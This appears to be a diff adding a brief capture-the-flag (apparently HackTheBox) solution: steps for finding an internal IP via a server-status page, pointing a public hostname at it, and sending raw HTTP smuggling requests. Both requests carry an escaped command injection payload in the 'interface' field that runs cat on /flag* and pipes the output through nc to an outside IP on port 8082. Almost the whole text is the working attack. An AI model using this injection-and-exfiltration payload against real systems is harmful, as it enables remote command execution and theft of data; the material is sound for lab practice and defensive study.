@@ -1,0 +1,25 @@
+1. Goto server-status endpoint and get the interal ip address 
+2. Make a public address to point to this internal ip address (in my case it is: htb.droidkitchen.com)
+3. Start somewhere that you have a real ip address a netcat server nc -l 8082
+4. Than Use the following HTTP Smuggling request (it has inlined 94.155.225.9:8082 it should be changed to you real ip address with the nc tcp server)
+POST http://htb.droidkitchen.com:5000/getAddr HTTP/1.1
+Host: htb.droidkitchen.com:5000
+Content-Type: application/json
+User-Agent: python-requests/2.31.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 88
+
+{"interface":"\u003bcat\u0024{IFS}/flag*\u007cnc\u0024{IFS}94.155.225.9\u0024{IFS}8082"}
+
+POST http://htb.droidkitchen.com:5000/flushInterface HTTP/1.1
+Host: htb.droidkitchen.com:5000
+Content-Type: application/json
+User-Agent: python-requests/2.31.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 88
+
+{"interface":"\u003bcat\u0024{IFS}/flag*\u007cnc\u0024{IFS}94.155.225.9\u0024{IFS}8082"}
